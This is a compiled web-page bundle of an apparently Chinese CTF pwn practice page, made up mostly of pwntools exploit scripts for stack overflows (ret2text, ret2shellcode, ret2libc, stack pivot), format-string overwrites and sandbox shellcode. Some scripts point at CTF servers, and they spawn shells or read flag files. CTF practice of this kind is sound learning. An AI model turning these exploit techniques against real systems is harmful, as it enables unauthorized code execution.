"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[2869],{4719:(e,n,l)=>{l.r(n),l.d(n,{assets:()=>d,contentTitle:()=>t,default:()=>p,frontMatter:()=>r,metadata:()=>i,toc:()=>o});var s=l(4848),a=l(8453);const r={sidebar_label:"\u7ec3\u4e60\u9898",sidebar_position:5},t="\u6808\u6ea2\u51fa",i={id:"Pwn/task",title:"\u6808\u6ea2\u51fa",description:"ret2text",source:"@site/docs/Pwn/task.md",sourceDirName:"Pwn",slug:"/Pwn/task",permalink:"/docs/Pwn/task",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Pwn/task.md",tags:[],version:"current",sidebarPosition:5,frontMatter:{sidebar_label:"\u7ec3\u4e60\u9898",sidebar_position:5},sidebar:"pwnSidebar",previous:{title:"\u8c03\u8bd5\u5b66\u4e60",permalink:"/docs/Pwn/gdb"},next:{title:"\u57fa\u7840\u77e5\u8bc6",permalink:"/docs/Pwn/note"}},d={},o=[{value:"ret2text",id:"ret2text",level:2},{value:"ret2text0_x32",id:"ret2text0_x32",level:3},{value:"ret2text1",id:"ret2text1",level:3},{value:"ret2text2",id:"ret2text2",level:3},{value:"ret2text3",id:"ret2text3",level:3},{value:"ret2shellcode",id:"ret2shellcode",level:2},{value:"ezshellcode",id:"ezshellcode",level:3},{value:"ret2syscall",id:"ret2syscall",level:2},{value:"ret2libc",id:"ret2libc",level:2},{value:"ORW",id:"orw",level:2},{value:"stack_pivot",id:"stack_pivot",level:2},{value:"fmt2_x64",id:"fmt2_x64",level:2},{value:"fmt3_x64",id:"fmt3_x64",level:2},{value:"canary",id:"canary",level:2},{value:"PIE",id:"pie",level:2},{value:"sandbox",id:"sandbox",level:2},{value:"shellcode",id:"shellcode",level:3}];function c(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"\u6808\u6ea2\u51fa",children:"\u6808\u6ea2\u51fa"}),"\n",(0,s.jsx)(n.h2,{id:"ret2text",children:"ret2text"}),"\n",(0,s.jsx)(n.h3,{id:"ret2text0_x32",children:"ret2text0_x32"}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'from pwn import *\ncontext(os="linux",arch="i386",log_level="debug")\nelf = ELF("ezr0p")\nio = process("ezr0p")\nsys_adr = elf.symbols["system"]\nshell_adr = 0x804A080\ncallsys = 0x8048562\nprint("sys_adr -------\x3e "+ hex(sys_adr))\n# payload = b\'s\' * (28+4) + p32(sys_adr) + p32(0)+ p32(shell_adr)\npayload = b\'s\' * (28+4) + p32(callsys)+ p32(shell_adr)\nio.recvuntil(b"please tell me your name")\nio.send(b"/bin/sh")\nio.recvuntil(b"now it\'s your play time~")\nio.send(payload)\nio.interactive()\n'})}),"\n",(0,s.jsx)(n.h3,{id:"ret2text1",children:"ret2text1"}),"\n",(0,s.jsx)(n.p,{children:"\u82e5\u672c\u5730\u73af\u5883\u5927\u4e8eUbuntu18\uff0c\u5219\u9700\u8981\u4f7f\u7528clibc\u53bb\u5c06\u7a0b\u5e8f\u7684glibc\u7248\u672c\u4fee\u6539\u5230\u65e7\u7248\u672c\uff0c\u5426\u5219\u65e0\u6cd5\u6210\u529f\u5229\u7528\u6f0f\u6d1e\u3002"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://github.com/tower111/pwn-change-libc",children:"\u4e0b\u8f7d\u94fe\u63a5"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"git clone https://github.com/tower111/pwn-change-libc\ncd pwn-change-libc\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u6b64\u9879\u76ee\u4e0bupdate_list\u6587\u4ef6\u7b2c\u4e00\u884c\u7684python\u6539\u4e3apython3"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"python3 get_env.py\nsudo ln -s <clibc\u7684\u7edd\u5bf9\u8def\u5f84> /usr/bin/clibc\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4f7f\u7528\u65b9\u6cd5\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"#clibc \u76ee\u6807\u6587\u4ef6 \u76ee\u6807\u7248\u672c\nclibc pwn 2.21\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"#\u5c06glibc\u7248\u672c\u6539\u4e3a\u65e7\u7248\u672c\nclibc pwn 2.23\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7b80\u5355\u7248\u672cexp\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\nelf = ELF(\"./pwn\") #\u4f7f\u7528ELF\u51fd\u6570\u53bb\u89e3\u6790\u76ee\u6807\u6587\u4ef6\uff0c\u5b58\u50a8\u4e3aelf\u5bf9\u8c61\nio = process(\"./pwn_new\") #\u542f\u52a8\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u547d\u540d\u4e3aio\nio.recvuntil(b\"do you know ret2text?\\n\") #\u4e00\u76f4\u63a5\u6536\u6570\u636e\uff0c\u76f4\u5230\u63a5\u6536\u5230\u6307\u5b9a\u6570\u636e\nback_door = 0x401235 #ida\u67e5\u627e\u540e\u95e8\u5730\u5740\npayload = b's'*0x58 + p64(back_door) #\u586b\u5145\u6b63\u5e38\u7a7a\u95f4+rbp + \u6076\u610f\u5730\u5740\nio.sendline(payload) #\u53d1\u9001payloa\nio.interactive() #\u8fdb\u884c\u4ea4\u4e92\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","\u9ad8\u7ea7\u624b\u52a8\u6784\u9020rop\u7684exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'from pwn import *\ncontext(os="linux",arch=\'amd64\',log_level="debug")\nelf = ELF("./pwn")\nio = process("./pwn")\nbackdoor = elf.symbols["backdoor"]\nsys_adr = elf.symbols["system"]\nprint(hex(backdoor))\npop_rdi = 0x4012c3\nshell_adr = 0x40201A\npayload = 0x58*b\'s\'+ p64(backdoor)\npayload = b\'s\' * 0x58 +p64(pop_rdi) + p64(shell_adr) +p64(sys_adr)\n# io.recvline()\nio.sendlineafter(b"do you know ret2text?",payload)\nio.interactive()\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u65b0\u7248\u6dfb\u52a0\u4e86\u6808\u5bf9\u9f50\u6821\u9a8c\u4e5f\u6709\u529e\u6cd5\u7ed5\u8fc7\uff0c\u6dfb\u52a0\u4e00\u4e2aret\u6307\u4ee4\u5373\u53ef\uff1a"}),"\n",(0,s.jsx)(n.p,{children:"\u4f7f\u7528ROPgadget\u67e5\u8be2ret\u6307\u4ee4\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'ROPgadget --binary ./pwn --only"pop|ret"\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"http://image.shangu127.top/img/2024/03/image-20240522173002990.png",alt:"image-20240522173002990"})}),"\n",(0,s.jsx)(n.p,{children:"\u6b64\u811a\u672c\u53ef\u4ee5\u5728\u9ad8\u7248\u672clinux\u4e2d\u6210\u529f\u5229\u7528\u6f0f\u6d1e\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\nelf = ELF(\"./pwn\") #\u4f7f\u7528ELF\u51fd\u6570\u53bb\u89e3\u6790\u76ee\u6807\u6587\u4ef6\uff0c\u5b58\u50a8\u4e3aelf\u5bf9\u8c61\nio = process(\"./pwn\") #\u542f\u52a8\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u547d\u540d\u4e3aio\nio.recvuntil(b\"do you know ret2text?\\n\") #\u4e00\u76f4\u63a5\u6536\u6570\u636e\uff0c\u76f4\u5230\u63a5\u6536\u5230\u6307\u5b9a\u6570\u636e\nback_door = 0x401235 #ida\u67e5\u627e\u540e\u95e8\u5730\u5740\nret = 0x40101a #ROPgadget --binary ./pwn --only \"pop|ret\"\npayload = b's'*0x58 + p64(ret) + p64(back_door) #\u586b\u5145\u6b63\u5e38\u7a7a\u95f4+rbp + \u6076\u610f\u5730\u5740\nio.sendline(payload) #\u53d1\u751fpayloa\nio.interactive() #\u8fdb\u884c\u4ea4\u4e92\n"})}),"\n",(0,s.jsx)(n.h3,{id:"ret2text2",children:"ret2text2"}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'from pwn import *\nfrom LibcSearcher import*\nimport sys\nremote_addr = ["49.233.15.226",8003]\n#libc=ELF(\'\')\nif len(sys.argv) == 1:\n    context.log_level="debug" \n    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) \n    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) \n    p = process("")\n    context(arch=\'\', os=\'linux\')\nif len(sys.argv) == 2 :\n    if \'r\' in sys.argv[1]:\n        p = remote(remote_addr[0],remote_addr[1])\n    if \'n\' not in sys.argv[1]:\n        context.log_level="debug" \n        #context(arch = \'amd64\', os = \'linux\')\nr = lambda : p.recv()\nrc = lambda x: p.recv(x)\nru = lambda x: p.recvuntil(x)\nrud = lambda x: p.recvuntil(x, drop=True)\ns = lambda x: p.send(x)\nsl = lambda x: p.sendline(x)\nsa = lambda x, y: p.sendafter(x, y)\nsla = lambda x, y: p.sendlineafter(x, y)\nshell = lambda : p.interactive()\npr = lambda name,x : log.info(name+\':\'+hex(x))\n\npop_rdi = 0x4012c3\nbin_sh = 0x404048\nsystem_addr = 0x401254\n\npayload = b\'a\' (0xa0 + 0x8) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)\nsl(payload)\n\nshell()\n'})}),"\n",(0,s.jsx)(n.h3,{id:"ret2text3",children:"ret2text3"}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\nfrom LibcSearcher import *\nimport sys\nremote_addr = [\"gxh191.top\",25534]\n#libc=ELF('')\nelf = ELF('./pwn3_2')\nif len(sys.argv) == 1:\n    context.log_level=\"debug\" \n    #p = process([\"qemu-aarch64\", \"-L\", \"/usr/aarch64-linux-gnu/\", \"-g\",\"1234\",\"./stack\"]) \n    #p = process([\"qemu-aarch64\", \"-L\", \".\", \"./stack\"]) \n    p = process(\"./pwn3_2\")\n    context(arch='amd64', os='linux')\nif len(sys.argv) == 2 :\n    if 'r' in sys.argv[1]:\n        p = remote(remote_addr[0],remote_addr[1])\n    if 'n' not in sys.argv[1]:\n        context.log_level=\"debug\" \n        #context(arch = 'amd64', os = 'linux')\nr = lambda : p.recv()\nrl = lambda : p.recvline()\nrc = lambda x: p.recv(x)\nru = lambda x: p.recvuntil(x)\nrud = lambda x: p.recvuntil(x, drop=True)\ns = lambda x: p.send(x)\nsl = lambda x: p.sendline(x)\nsa = lambda x, y: p.sendafter(x, y)\nsla = lambda x, y: p.sendlineafter(x, y)\nshell = lambda : p.interactive()\npr = lambda name,x : log.info(name+':'+hex(x))\n\n#gdb.attach(p)\nsystem_plt = p64(elf.plt['system'])\npop_rdi = p64(0x4012c3)\nbinsh = p64(0x404090)\nret = p64(0x40101a)\n\nru(b':\\n')\npayload = b'/bin/sh\\x00'\ns(payload)\nru(b'something: ')\npayload = b'a' * (0x10 + 8) + ret + pop_rdi + binsh + system_plt\ns(payload)\n\nshell()\n"})}),"\n",(0,s.jsx)(n.h2,{id:"ret2shellcode",children:"ret2shellcode"}),"\n",(0,s.jsx)(n.h3,{id:"ezshellcode",children:"ezshellcode"}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"from pwn import *\ncontext(os='linux',arch='i386',log_level='debug')\nelf = ELF(\"./pwn\")\n# io = remote(\"node4.buuoj.cn\",26890)\nio= process(\"./pwn\")\nio.recvuntil(b\"What's this:\")\nshell_adr = int(io.recv(10)[2:],16)\nprint(hex(shell_adr))\nshellcode = asm(shellcraft.sh())\npayload = shellcode\npayload = payload.ljust(140,b's')\npayload += p32(shell_adr)\nio.sendline(payload)\nio.interactive()\n"})}),"\n",(0,s.jsxs)(n.p,{children:[":star",":ret2libc","\u6253\u6cd5\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"from pwn import *\nimport sgtlibc\ncontext(os='linux',arch='i386',log_level='debug')\nelf = ELF(\"./pwn\")\nio = remote(\"node4.buuoj.cn\",26890)\n\nwrite_plt = elf.plt['write']\nwrite_got = elf.got['write']\nmain_adr = 0x804847B\npayload = b's'*140 + p32(write_plt) + p32(main_adr) + p32(1) + p32(write_got) + p32(4)\nio.sendline(payload)\nwrite_adr = u32(io.recv(4))\nlibc = sgtlibc.Searcher(\"write\",write_adr)\nsystem_adr = libc.get_address(sgtlibc.s_system)\nshell_adr = libc.get_address(sgtlibc.s_binsh)\npayload2 = b's'*140 + p32(system_adr) + p32(0) + p32(shell_adr)\nio.sendline(payload2)\nio.interactive()\n"})}),"\n",(0,s.jsx)(n.h2,{id:"ret2syscall",children:"ret2syscall"}),"\n",(0,s.jsx)(n.h2,{id:"ret2libc",children:"ret2libc"}),"\n",(0,s.jsx)(n.h2,{id:"orw",children:"ORW"}),"\n",(0,s.jsx)(n.h2,{id:"stack_pivot",children:"stack_pivot"}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'from pwn import *\nimport sgtlibc\ncontext(os="linux",arch=\'amd64\',log_level=\'debug\')\nelf=ELF("pwn")\nio=process("./pwn")\n\nread_adr = 0x4011FD\naddr1 = 0x404858\npayload1 = b\'s\'*80 + p64(addr1) + p64(read_adr)\nio.sendlineafter(b"do you know stack pivoting?",payload1)\nputs_got = elf.got["puts"]\nputs_plt = elf.plt["puts"]\npop_rdi = 0x401283\nleave_ret = 0x40121d\npayload2 = p64(0x404808)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(read_adr)\npayload2 = payload2.ljust(80,b\'\\x00\') + p64(0x404808) + p64(leave_ret)\nio.send(payload2)\nputs_adr = u64(io.recvuntil(b"\\x7f")[-6:].ljust(8,b"\\x00"))\nprint("puts_adr -----\x3e "+hex(puts_adr))\nlibc = sgtlibc.Searcher()\nlibc.add_condition("puts",puts_adr)\nlibc.dump(db_index=2)\nsystem_adr = libc.get_address(sgtlibc.s_system)\nshell_adr = libc.get_address(sgtlibc.s_binsh)\n# gdb.attach(io)\n# pause()\npayload3 = p64(0) + p64(pop_rdi) + p64(shell_adr) + p64(system_adr)\npayload3 = payload3.ljust(80,b"\\x00") + p64(0x4047b8) + p64(leave_ret)\nio.send(payload3)\n\nio.interactive()\n'})}),"\n",(0,s.jsx)(n.h1,{id:"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32",children:"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32"}),"\n",(0,s.jsx)(n.h2,{id:"fmt2_x64",children:"fmt2_x64"}),"\n",(0,s.jsxs)(n.p,{children:["\u2b50","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'from pwn import *\nimport sgtlibc\np = process("./fmt2_x64")\n\np.sendafter(b">>>\\n", "%39$p")\nlibc = int(p.recv(14).decode("utf-8"), 16) - 0x21c87\nprint(hex(libc))\none = libc + 0x4f420\ncontext.arch = \'amd64\'\nsuccess(hex(one))\npayload = fmtstr_payload(6, {0x601028:p64(one)})\np.sendline(payload)\n\np.interactive()\n'})}),"\n",(0,s.jsx)(n.h2,{id:"fmt3_x64",children:"fmt3_x64"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\nio = process(\"./fmt3_x64\")\npayload = fmtstr_payload(6,{0x6009b8:0x4006f8})\nprint(payload)\nio.recvuntil(b\">>>\")\ngdb.attach(io)\npause()\nio.sendline(payload)\nio.interactive()\n"})}),"\n",(0,s.jsx)(n.h1,{id:"\u4fdd\u62a4\u7ed5\u8fc7",children:"\u4fdd\u62a4\u7ed5\u8fc7"}),"\n",(0,s.jsx)(n.h2,{id:"canary",children:"canary"}),"\n",(0,s.jsx)(n.h2,{id:"pie",children:"PIE"}),"\n",(0,s.jsx)(n.h2,{id:"sandbox",children:"sandbox"}),"\n",(0,s.jsx)(n.h3,{id:"shellcode",children:"shellcode"}),"\n",(0,s.jsxs)(n.p,{children:["\u2b50","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\ncontext(os='linux',arch=\"amd64\",log_level='debug')\nelf = ELF(\"./shellcode\")\nshangu = 0\nio = process(\"./shellcode\")\n\nshellcode = asm(shellcraft.cat('flag'))\nshellcode2 = asm('''\nsub rsp,0x30\ncall rsp\n''')\nprint(shellcode)\nshellcode=shellcode.ljust(0x28,b\"\\x00\")\n\njmp_jsp = 0x400785\npayload = shellcode + p64(jmp_jsp) + shellcode2\ngdb.attach(io)\npause()\nio.sendafter(b\"Can u pwn me?\",payload)\nio.interactive()\n"})})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(c,{...e})}):c(e)}},8453:(e,n,l)=>{l.d(n,{R:()=>t,x:()=>i});var s=l(6540);const a={},r=s.createContext(a);function t(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:t(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);